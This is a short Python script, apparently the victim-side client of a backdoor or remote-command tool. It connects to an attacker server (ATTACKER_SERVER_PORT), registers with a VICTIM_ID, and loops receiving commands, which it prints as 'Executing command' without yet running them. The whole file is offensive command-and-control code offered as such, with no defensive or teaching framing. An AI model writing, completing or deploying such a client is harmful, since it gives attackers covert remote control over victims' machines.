# Writer: Gal Harari
# Date: 04/05/2020
import socket
import time
from globals import *

HOST = SERVER_IP  # The server's hostname or IP address
PORT = ATTACKER_SERVER_PORT  # The port used by the server


def connect_protocol(s):
    s.send(VICTIM_ID.encode())

    # get an OK signal
    inp = ''
    inp = s.recv(OK_SIZE).decode()

    print(f'Got from the server: {inp}')
    return s


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    s = connect_protocol(s)
    while True:
        cmd = s.recv(CMD_SIZE)
        print(f"Executing command {cmd}")
